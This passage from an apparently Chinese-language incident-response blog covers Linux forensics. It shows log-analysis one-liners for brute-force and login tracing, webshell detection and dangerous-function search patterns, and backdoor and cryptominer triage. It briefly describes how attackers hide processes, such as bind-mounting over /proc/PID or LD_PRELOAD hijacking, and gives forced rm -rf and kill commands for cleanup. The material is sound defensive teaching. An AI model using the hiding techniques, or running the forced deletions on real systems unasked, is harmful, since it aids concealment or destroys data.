class="hljs-keyword">list</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;3:on\|5:on&quot;</span><br></code></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看服务安装位置 ，一般是在<span class="hljs-regexp">/user/</span>local/<br>service httpd start<br>搜索<span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  查看是否存在<br></code></pre></td></tr></table></figure><h3 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h3><p>1、查看敏感目录，如&#x2F;tmp 目录下的文件，同时注意隐藏文件夹，以“.*”为名的文件夹具有隐藏属性</p><p>2、得到发现 WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>可以使用 find 命令来查找，如 <code> find /opt -iname &quot;*&quot; -atime 1 -type f</code> 找出 &#x2F;opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">定位有多少IP在爆破主机的root帐号：    <br>grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br><br>定位有哪些IP在爆破：<br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="hljs-string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|<span class="hljs-built_in">uniq</span> -c<br><br>爆破用户名字典是什么？<br> grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br><br>登录成功的IP有哪些：     <br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br><br>登录成功的日期、用户名、IP：<br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> <br><br>增加一个用户kali日志：<br>Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001<br>Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bash<br>Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="hljs-keyword">for</span> kali<br><span class="hljs-comment">#grep &quot;useradd&quot; /var/log/secure </span><br><br>删除用户kali日志：<br>Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="hljs-string">&#x27;kali&#x27;</span><br>Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="hljs-string">&#x27;kali&#x27;</span> owned by <span class="hljs-string">&#x27;kali&#x27;</span><br>Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="hljs-string">&#x27;kali&#x27;</span> owned by <span class="hljs-string">&#x27;kali&#x27;</span><br>grep <span class="hljs-string">&quot;userdel&quot;</span> /var/log/secure<br><br>su切换用户：<br>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="hljs-keyword">for</span> user good by root(uid=0)<br><br>sudo授权执行<br>sudo -l<br><br>列出当天访问次数最多的IP命令：<br><span class="hljs-built_in">cut</span> -d- -f 1 log_file|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20<br><br>查看当天有多少个IP访问：<br>awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|<span class="hljs-built_in">sort</span>|<span class="hljs-built_in">uniq</span>|<span class="hljs-built_in">wc</span> -l<br><br>查看某一个页面被访问的次数：<br>grep <span class="hljs-string">&quot;/index.php&quot;</span> log_file | <span class="hljs-built_in">wc</span> -l<br><br>查看每一个IP访问了多少个页面：<br>awk <span class="hljs-string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27;</span> log_file<br><br>将每个IP访问的页面数进行从小到大排序：<br>awk <span class="hljs-string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27;</span> log_file | <span class="hljs-built_in">sort</span> -n<br><br>查看某一个IP访问了哪些页面：<br>grep ^111.111.111.111 log_file| awk <span class="hljs-string">&#x27;&#123;print $1,$7&#125;&#x27;</span><br><br>去掉搜索引擎统计当天的页面：<br>awk <span class="hljs-string">&#x27;&#123;print $12,$1&#125;&#x27;</span> log_file | grep ^\&quot;Mozilla | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">wc</span> -l<br><br>查看2018年6月21日14时这一个小时内有多少IP访问:<br>awk <span class="hljs-string">&#x27;&#123;print $4,$1&#125;&#x27;</span> log_file | grep 21/Jun/2018:14 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><h3 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a><strong>应急工具</strong></h3><p><strong>BusyBox</strong><br>静态链接库的 BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测 RootKit 的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的 UDP&#x2F;TCP 进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在 so 文件的注入</p><p><strong>河马 Webshell</strong></p><p><strong>RPM 包</strong></p><p><strong>查找文件中的恶意&#x2F;危险函数</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">PHP</span>: <span class="hljs-function"><span class="hljs-title">eval</span>(、<span class="hljs-title">system</span>(、<span class="hljs-variable">assert</span> (</span><br><span class="hljs-function"><span class="hljs-variable">JSP</span>: <span class="hljs-title">getRunTime</span>(、<span class="hljs-title">FileOutputStream</span>(</span><br><span class="hljs-function"><span class="hljs-variable">ASP</span>: <span class="hljs-title">eval</span>(、<span class="hljs-title"><span class="hljs-built_in">execute</span></span>(、<span class="hljs-variable">ExecuteGlobal</span> (</span><br></code></pre></td></tr></table></figure><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问 URL 排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat access.log |awk ‘{print $7}’ |grep &#x2F;%25Domain |sort|uniq - c |sort -rn|more</p><h1 id="攻击溯源"><a href="#攻击溯源" class="headerlink" title="攻击溯源"></a>攻击溯源</h1><h1 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h1><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>首先，通过浏览器以 HTTP 协议访问 Web Server 上的一个 CGI 文件，是一个合法的 TCP 连接，TCP&#x2F;IP 的应用层之下没有任何特征，只能在<strong>应用层进行检测</strong>。<br>黑客不管是传文件还是改文件，必然有一个文件会包含 webshell 代码，很容易想到从文件代码入手，这是<strong>静态特征检测</strong>。<br>webshell 运行后，B&#x2F;S 数据通过 HTTP 交互，HTTP 请求&#x2F;响应中可以找到蛛丝马迹，这是<strong>动态特征检测</strong>。</p><p>【静态检测】</p><p>静态检测通过匹配特征码，特征值，危险函数函数来查找 webshell 的方法。</p><p>优点是快速方便，对已知的 webshell 查找准确率高，部署方便。</p><p>缺点漏报率、误报率高，无法查找 0day 型 webshell，而且容易被绕过。</p><p>【静态检测配合人工】<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>【动态检测】</p><p>Linux 下就是 nobody 用户起了 bash，Win 下就是 IIS User 启动 cmd，这些都是动态特征。</p><p>如果黑客反向连接的话，那很更容易检测了，Agent 和 IDS 都可以抓现行。</p><p>Webshell 总有一个 HTTP 请求，如果我在网络层监控 HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了 200，则很容易定位到 webshell，这便是 http 异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p><p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><p>【日志检测】</p><p>使用 Webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 Webshell 页</p><p>面的访问数据和数据提交记录。</p><p>日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP 异常请求模型检测</p><p>【寻找 webshell】<br>1.自动化查找：D 盾 河马 fotify<br>2.手动查找：windows sublime 全文件夹查找 IDE PHPSTORM 全局查找<br>Linux 命令查找 <code>grep -rn &quot;eval(&quot; *</code><br>webshell 特征 PHP 的危险函数<br>还有 <code>phar &lt;?php XXXXX</code></p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>1.限制上传的文件夹解析方式</p><p>2.匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</p><p>3.给予上传的文件夹二级域名并且不给予解析权限</p><p>4.只能局域网访问</p><h1 id="问题处置-1"><a href="#问题处置-1" class="headerlink" title="问题处置"></a>问题处置</h1><h2 id="文件无法删除"><a href="#文件无法删除" class="headerlink" title="文件无法删除"></a><strong>文件无法删除</strong></h2><h3 id="进程占用"><a href="#进程占用" class="headerlink" title="进程占用"></a><strong>进程占用</strong></h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">lsof</span> xxxx.xx<br></code></pre></td></tr></table></figure><h3 id="隐藏属性"><a href="#隐藏属性" class="headerlink" title="隐藏属性"></a><strong>隐藏属性</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sattr xxxx<span class="hljs-selector-class">.xx</span><br>chattr -<span class="hljs-selector-tag">a</span> xxxx<span class="hljs-selector-class">.xx</span><br>chattr -<span class="hljs-selector-tag">i</span> xxxx.xx<br></code></pre></td></tr></table></figure><h3 id="上层文件存在-SBIT-权限"><a href="#上层文件存在-SBIT-权限" class="headerlink" title="上层文件存在 SBIT 权限"></a><strong>上层文件存在 SBIT 权限</strong></h3><p>这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 777 也无法进行删除。<br>当目录被设置了粘滞位权限以后，即便用户对该目录有写入权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和 root 用户才有权将其删除。<br>这种办法可以保持一种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。<br>需要注意的是，粘滞位权限只能针对目录设置，对于文件无效。<br>设置了粘滞位权限的目录，使用 ls 命令查看其属性时，其他用户权限处的“x”将变为“t”。<br>粘滞位权限都是针对其他用户设置，使用 chmod 命令设置目录权限时，“o+t”、“o-t”权限模式可分别用于添加、移除粘滞位权限。</p><h2 id="netstat-pantu-不显示-pid-而显示"><a href="#netstat-pantu-不显示-pid-而显示" class="headerlink" title="netstat -pantu 不显示 pid 而显示 -"></a><strong>netstat -pantu 不显示 pid 而显示 -</strong></h2><p>可能是使用了 <code>mkdir .hidden 或者 mount -o bind .hidden /proc/PID</code> 来隐藏</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cat <span class="hljs-string">/proc/</span>$$<span class="hljs-string">/mountinfo</span>   <span class="hljs-string">//</span>查询挂载信息<br>umount <span class="hljs-string">/proc/PID</span>   <span class="hljs-string">//</span>取消挂载<br></code></pre></td></tr></table></figure><h2 id="ps-和-top-看不到恶意进程"><a href="#ps-和-top-看不到恶意进程" class="headerlink" title="ps 和 top 看不到恶意进程"></a><strong>ps 和 top 看不到恶意进程</strong></h2><ol><li>挂载被隐藏（看上一个的操作）</li><li>命令被替换（使用 busybox 进行检修）</li><li>LD_PRELOAD 等方法共享库劫持（使用 busybox 进行检修）</li></ol><h2 id="快速查找文件"><a href="#快速查找文件" class="headerlink" title="快速查找文件"></a><strong>快速查找文件</strong></h2><p>【which】<br>从环境变量查找系统命令的具体文件位置<br>【whereis】<br>从&#x2F;usr 目录快速查找文件<br>【locate】<br>从 locatedb 数据库查找文件路径<br>【find】<br>强大的搜索命令<br><code>find &lt;检索路径&gt; &lt;选项&gt; &lt;搜索内容&gt;</code><br><a href="https://cloud.tencent.com/developer/article/1348438">具体使用方法</a></p><h2 id="确定系统信息"><a href="#确定系统信息" class="headerlink" title="确定系统信息"></a><strong>确定系统信息</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue   <span class="hljs-regexp">//</span>系统版本<br>uname -m<br>getconf LONG_BIT   <span class="hljs-regexp">//</span>查看系统位数<br>cat <span class="hljs-regexp">/proc/</span>version   <span class="hljs-regexp">//</span>查看内核版本<br>uname -a<br></code></pre></td></tr></table></figure><h2 id="系统完整性检测"><a href="#系统完整性检测" class="headerlink" title="系统完整性检测"></a><strong>系统完整性检测</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Va   <span class="hljs-regexp">//</span>Centos<br>apt install debsums   <span class="hljs-regexp">//</span>Ubuntu、Debian<br>debsums --all --changed<br></code></pre></td></tr></table></figure><h2 id="系统文件监控工具"><a href="#系统文件监控工具" class="headerlink" title="系统文件监控工具"></a><strong>系统文件监控工具</strong></h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">AIDE<span class="hljs-string">\inotify\tripwire</span><br></code></pre></td></tr></table></figure><h2 id="查看-glibc-版本"><a href="#查看-glibc-版本" class="headerlink" title="查看 glibc 版本"></a><strong>查看 glibc 版本</strong></h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ldd <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h2 id="误删文件恢复"><a href="#误删文件恢复" class="headerlink" title="误删文件恢复"></a><strong>误删文件恢复</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复<br>如果正在进行读写操作：<br>lsof   <span class="hljs-regexp">//</span>查找进程文件恢复即可<br>mount   <span class="hljs-regexp">//</span>查看所有挂载点<br>umount   <span class="hljs-regexp">//</span>删除挂载点<br>lsblk -f   <span class="hljs-regexp">//</span>查看所有设备的挂载情况<br>df -T 路径   <span class="hljs-regexp">//</span>可查看该路径的所属挂载点、所在分区、所在分区的文件系统类型<br>cat <span class="hljs-regexp">/proc/</span>filesystems   <span class="hljs-regexp">//</span>查看文件系统的类型<br>常用恢复工具有：Extundelete、Debugfs、R-Linux、Ext3grep、Ext4magic<br></code></pre></td></tr></table></figure><h2 id="批量检索文件并打印信息"><a href="#批量检索文件并打印信息" class="headerlink" title="批量检索文件并打印信息"></a><strong>批量检索文件并打印信息</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;内容&quot;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$line</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">ls</span> -al <span class="hljs-variable">$line</span>; <span class="hljs-keyword">elif</span> [ -d <span class="hljs-variable">$line</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">ls</span> -al ../ | grep <span class="hljs-variable">$line</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="拷贝取证"><a href="#拷贝取证" class="headerlink" title="拷贝取证"></a><strong>拷贝取证</strong></h2><ol><li>使用虚拟化平台存储快照</li><li>打包整个系统</li><li>全盘拷贝（推荐 clonezilla）</li><li>进程拷贝（推荐 CRIU）</li><li>组合运用（冻结进程 + 全盘拷贝 + 恢复进程）</li></ol><h1 id="远控后门"><a href="#远控后门" class="headerlink" title="远控后门"></a>远控后门</h1><h2 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a><strong>获取事件告警信息</strong></h2><p>监控 EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h2 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a><strong>定位后门文件</strong></h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">根据告警信息定位后门文件位置，查找进程pid<br>lsof | <span class="hljs-keyword">grep</span> xxxx.xx<br>lsof <span class="hljs-regexp">/root/</span>xxxx.xx<br>fuser <span class="hljs-regexp">/root/</span>xxxx.xx<br></code></pre></td></tr></table></figure><h2 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a><strong>查看外连事件详情</strong></h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">根据五元组来查找通信的端口ip对应的pid<br>netstat -pantu <span class="hljs-string">| grep 114.114.114.114</span><br>netstat -pantu <span class="hljs-string">| grep 65533</span><br>lsof -i:<span class="hljs-number">65533</span><br></code></pre></td></tr></table></figure><h2 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a><strong>查找进程信息</strong></h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tcl">查找进程相关文件<br>lsof -p <span class="hljs-number">1234</span>   （需要root权限）<br>pwdx<br>获取<span class="hljs-keyword">pid</span>程序详细信息<br>lsof -p <span class="hljs-keyword">pid</span><br>pwdx <span class="hljs-keyword">pid</span><br>systemctl status <span class="hljs-keyword">pid</span><br>cat /<span class="hljs-keyword">proc</span>/pid/maps<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -al /<span class="hljs-keyword">proc</span>/pid/exe<br></code></pre></td></tr></table></figure><h2 id="根据-pid-查看对应线程"><a href="#根据-pid-查看对应线程" class="headerlink" title="根据 pid 查看对应线程"></a><strong>根据 pid 查看对应线程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-built_in">H</span> <span class="hljs-literal">-T</span> <span class="hljs-literal">-p</span> pid<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aLf</span> pid<br>pstree <span class="hljs-literal">-agplU</span>（推荐使用）<br></code></pre></td></tr></table></figure><h2 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a><strong>确定进程运行时间</strong></h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -eo pid,lstart,etime,cmd | <span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;pid&gt;</span><br></code></pre></td></tr></table></figure><h2 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a><strong>比对恶意文件的创建时间</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> xxx.xx<br><span class="hljs-built_in">ls</span> -al xxx.xx<br></code></pre></td></tr></table></figure><h2 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a><strong>样本采集分析</strong></h2><p>使用 SCP&#x2F;Xshell 等将样本移出主机，计算哈希值后到威胁情报平台中去搜索<br>certutil -hashfile 文件 MD5</p><h2 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a><strong>进程查杀</strong></h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">【查找子进程】<br>ps ajfx<br>systemctl <span class="hljs-built_in">status</span><br>【杀死进程】<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> pid   （这样子是杀不死子进程的！！！）<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> -pid   （杀掉进程组）<br></code></pre></td></tr></table></figure><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a><strong>删除文件</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看文件占用，解除占用后删除<br>lsof xxxx.xx<br>移除 i, a 属性<br>chattr -ia file.sh<br>查看是否移除成功<br>lsattr file.sh<br>移除文件<br><span class="hljs-built_in">rm</span> -rf file.sh<br>奇怪文件名无法删除，先查inode再删除<br><span class="hljs-built_in">ls</span> -li xxxx.xx<br>find ./* -inum 12327526 -delete<br>find ./ -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -i &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; \;<br>find ./* -inum 12327526 |xargs <span class="hljs-built_in">rm</span> -f<br><span class="hljs-built_in">rm</span> <br>find ./* -inum 12327526<br>目录挂载无法删除（Device or resource busy）<br>sudo lsblk -a<br>sudo umount /dev/sdb1<br><span class="hljs-built_in">rm</span> -rf xxxx.xx<br></code></pre></td></tr></table></figure><h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><p>威胁情报的获取源</p><blockquote><p>谷歌：<a href="http://www.google.com/">www.google.com</a></p><p>百度：<a href="http://www.baidu.com/">www.baidu.com</a></p><p>Virustotal：<a href="http://www.virustotal.com/">www.virustotal.com</a></p><p>微步在线：x.threatbook.cn</p><p>腾讯哈勃：habo.qq.com</p><p>Virscan：virusscan.jotti.org</p><p>Freebuf：<a href="http://www.freebuf.com/">www.freebuf.com</a></p><p>Jotti：virusscan.jotti.org</p><p>Scandir：<a href="http://www.scandir.com/">www.scandir.com</a></p><p>Alexa排名：<a href="http://www.alexa.com/">www.alexa.com</a></p><p>备案查询：beian.cndns.com</p><p>深信服安全中心：sec.sangfor.com.cn</p><p>深信服威胁分析平台：wiki.sec.sangfor.com.cn</p><p>深信服EDR安全软件中心：edr.sangfor.com.cn</p></blockquote><p>黑客通过随机域名，动态域名，近期域名，顶级域名，暗网代理域名攻击</p><h1 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h1><ul><li><strong>蠕虫：</strong>自动复制自身的副本到其它主机的病毒。</li><li><strong>木马：</strong>隐蔽性强，多用于监控用户行为或盗取用户数据的病毒。</li><li><strong>感染型病毒：</strong>能将自身恶意代码插入正常文件的病毒。</li><li><strong>脚本病毒：</strong>使用脚本编写的病毒。</li><li><strong>宏病毒：</strong>宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</li><li><strong>僵尸网络病毒：</strong>能形成大型的一对多，多对多控制的远程控制病毒。</li><li><strong>后门：</strong>在主机上开放端口允许远程非授权访问。</li><li><strong>挖矿病毒</strong>：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</li><li><strong>勒索病毒</strong>：能对用户文件进行加密的病毒。</li></ul><h1 id="挖矿排查"><a href="#挖矿排查" class="headerlink" title="挖矿排查"></a>挖矿排查</h1><p><strong>获取信息</strong></p><ul><li>下线服务器之后从 DNS 服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的 IP&#x2F;域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的 pid</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl">CPU占用：<br>top -c -o %CPU<br>ps -eo pid,ppid,%mem,%cpu,cmd --<span class="hljs-keyword">sort</span>=-%cpu | head -n <span class="hljs-number">5</span><br>内存占用：<br>top -c -o %MEM<br>ps -eo pid,ppid,%mem,%cpu,cmd --<span class="hljs-keyword">sort</span>=-%mem | head -n <span class="hljs-number">5</span><br>网络占用：<br>安装后使用nethogs或者jnettop进行查询<br>根据进程名或字符串查询：<br>pidof <span class="hljs-string">&quot;name&quot;</span><br>ps -aux | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;name&quot;</span><br>ps -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;name&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br>pgrep -f <span class="hljs-string">&quot;name&quot;</span><br></code></pre></td></tr></table></figure><ul><li>根据 pid 查询详细信息（当查询不到时有可能是&#x2F;proc&#x2F;pid 隐藏了）</li></ul><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 